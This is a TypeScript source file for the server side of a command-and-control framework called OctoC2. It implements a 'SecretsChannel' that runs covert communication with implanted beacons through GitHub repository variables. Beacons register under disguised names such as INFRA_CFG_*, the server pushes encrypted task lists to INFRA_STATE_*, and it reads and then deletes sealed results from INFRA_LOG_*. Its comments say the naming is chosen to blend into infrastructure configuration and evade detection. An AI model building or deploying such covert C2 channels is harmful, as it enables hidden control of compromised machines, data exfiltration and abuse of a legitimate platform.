/**
 * OctoC2 Server — SecretsChannel
 *
 * Polls GitHub Repository Variables every pollIntervalMs for beacon activity.
 * Uses OPSEC-safe variable naming that blends into infrastructure config management:
 *
 *   INFRA_CFG_{ID8}     — Beacon → Server  ACK / registration  base64({ k: pubkey, t: ts })
 *   INFRA_STATE_{ID8}   — Server → Beacon  Encrypted Task[] blob (JSON encryptBox envelope)
 *   INFRA_LOG_{TASKID8} — Beacon → Server  Sealed TaskResult blob (sealedB64)
 *
 * Variable name prefixes used for scanning:
 *   ACK prefix:    "INFRA_CFG_"
 *   Result prefix: "INFRA_LOG_"
 *
 * Crypto:
 *   Incoming results (beacon → server): crypto_box_seal — openSealBox()
 *   Outgoing tasks   (server → beacon): crypto_box      — encryptForBeacon()
 *
 * Note: This channel uses a different naming scheme from ActionsChannel
 * (INFRA_STATUS_*, INFRA_JOB_*, INFRA_RESULT_*) to provide an independent
 * covert channel with distinct OPSEC fingerprint.
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes, bytesToBase64,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

// Regex patterns for variable name matching
const ACK_RE    = /^INFRA_CFG_([0-9a-f]{8})$/;
const RESULT_RE = /^INFRA_LOG_([0-9a-f]{8})$/;

interface SecretsChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
}

interface AckPayload {
  /** Beacon public key (base64url) */
  k: string;
  /** Checkin timestamp (ISO-8601) */
  t: string;
}

interface ResultPayload {
  taskId:      string;
  beaconId:    string;
  success:     boolean;
  output:      string;
  completedAt: string;
}

export class SecretsChannel {
  private timer: ReturnType<typeof setInterval> | null = null;

  /**
   * Map from id8 → beaconId for beacons registered via the ACK variable.
   * We use id8 as the key because the ACK variable name only encodes id8.
   */
  private readonly secretsBeacons = new Map<string, string>(); // id8 → beaconId

  /** id8 values whose ACK variable we have already processed */
  private readonly seenAckId8s = new Set<string>();

  /** taskId8 values whose RESULT variable we have already processed */
  private readonly seenResultId8s = new Set<string>();

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     SecretsChannelOpts,
  ) {}

  start(): void {
    if (this.timer) return;
    this.timer = setInterval(() => {
      this.poll().catch(err =>
        console.error("[SecretsChannel] Poll error:", (err as Error).message)
      );
    }, this.opts.pollIntervalMs);
    console.log("[SecretsChannel] Started polling");
  }

  stop(): void {
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
      console.log("[SecretsChannel] Stopped");
    }
  }

  // ── Poll cycle ─────────────────────────────────────────────────────────────

  private async poll(): Promise<void> {
    const { owner, repo } = this.opts;
    await this.processAckVariables(owner, repo);
    await this.processResultVariables(owner, repo);
    await this.deliverPendingTasks(owner, repo);
  }

  // ── ACK variable processing ────────────────────────────────────────────────

  /**
   * List all repo variables and filter for names matching INFRA_CFG_{ID8}.
   * Each matching variable base64-decodes to { k: pubkey, t: ts }
   * and registers the beacon in the registry.
   */
  private async processAckVariables(owner: string, repo: string): Promise<void> {
    let variables: any[];
    try {
      const resp = await this.opts.octokit.rest.actions.listRepoVariables({
        owner, repo, per_page: 100,
      });
      variables = (resp.data as any).variables ?? [];
    } catch (err) {
      console.warn("[SecretsChannel] Failed to list variables:", (err as Error).message);
      return;
    }

    for (const variable of variables) {
      const name: string = variable.name ?? "";
      const match = ACK_RE.exec(name);
      if (!match) continue;

      const id8 = match[1]!;
      if (this.seenAckId8s.has(id8)) continue;
      this.seenAckId8s.add(id8);

      try {
        // Value is base64-encoded JSON { k: pubkey, t: ts }
        const raw = (variable.value ?? "").trim();
        if (!raw) continue;

        let ack: AckPayload;
        try {
          const decoded = Buffer.from(raw, "base64").toString("utf8");
          ack = JSON.parse(decoded) as AckPayload;
        } catch {
          continue;
        }
        if (!ack.k) continue;

        // Reconstruct or reuse beaconId: find existing beacon whose ID starts with id8
        const existingBeacon = this.registry.getAll().find(
          b => b.beaconId.startsWith(id8)
        );
        const beaconId = existingBeacon?.beaconId ?? id8;

        this.registry.register({
          beaconId,
          issueNumber: 0,
          publicKey:   ack.k,
          hostname:    "unknown",
          username:    "unknown",
          os:          "unknown",
          arch:        "unknown",
          seq:         0,
        });
        this.secretsBeacons.set(id8, beaconId);

        console.log(`[SecretsChannel] Registered beacon ${beaconId} from ACK variable ${name}`);
      } catch (err) {
        console.warn("[SecretsChannel] ACK processing error:", (err as Error).message);
      }
    }
  }

  // ── Result variable processing ─────────────────────────────────────────────

  /**
   * List all repo variables and filter for names matching INFRA_LOG_{TASKID8}.
   * Each matching variable contains a sealed TaskResult; decrypt, mark
   * task completed, and delete the variable.
   */
  private async processResultVariables(owner: string, repo: string): Promise<void> {
    let variables: any[];
    try {
      const resp = await this.opts.octokit.rest.actions.listRepoVariables({
        owner, repo, per_page: 100,
      });
      variables = (resp.data as any).variables ?? [];
    } catch (err) {
      console.warn("[SecretsChannel] Failed to list variables:", (err as Error).message);
      return;
    }

    for (const variable of variables) {
      const name: string = variable.name ?? "";
      const match = RESULT_RE.exec(name);
      if (!match) continue;

      const taskId8 = match[1]!;
      if (this.seenResultId8s.has(taskId8)) continue;

      try {
        const sealed = (variable.value ?? "").trim();
        if (!sealed) continue;

        // Derive operator public key from secret key
        await _sodium.ready;
        const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);

        const plainBytes = await openSealBox(sealed, operatorPublicKey, this.opts.operatorSecretKey);
        const plain = new TextDecoder().decode(plainBytes);
        const result = JSON.parse(plain) as ResultPayload;

        if (result.taskId) {
          this.queue.markCompleted(result.taskId, plain);
          this.seenResultId8s.add(taskId8);
          console.log(`[SecretsChannel] Task ${result.taskId} completed (success=${result.success})`);
        }

        // Delete the result variable
        try {
          await this.opts.octokit.rest.actions.deleteRepoVariable({
            owner, repo, name,
          });
        } catch { /* best-effort */ }
      } catch (err) {
        console.warn("[SecretsChannel] Result processing error:", (err as Error).message);
      }
    }
  }

  // ── Task delivery ──────────────────────────────────────────────────────────

  /**
   * For each registered secrets-channel beacon with pending tasks:
   * encrypt the Task[] and write a `INFRA_STATE_{ID8}` variable.
   */
  private async deliverPendingTasks(owner: string, repo: string): Promise<void> {
    for (const [id8, beaconId] of this.secretsBeacons) {
      const allPending = this.queue.getPendingTasks(beaconId);
      const pending = allPending.filter(
        t => !t.preferredChannel || t.preferredChannel === "secrets"
      );
      if (pending.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) continue;

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(pending.map(t => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        const varName = `INFRA_STATE_${id8}`;

        // Try update first; create on 404
        try {
          await this.opts.octokit.rest.actions.updateRepoVariable({
            owner, repo, name: varName,
            value: JSON.stringify(encrypted),
          });
        } catch (err: any) {
          if (err?.status === 404) {
            await this.opts.octokit.rest.actions.createRepoVariable({
              owner, repo, name: varName,
              value: JSON.stringify(encrypted),
            });
          } else {
            throw err;
          }
        }

        // Mark tasks as delivered
        for (const t of pending) {
          this.queue.markDelivered(t.taskId);
        }

        console.log(`[SecretsChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        console.warn(`[SecretsChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }
}
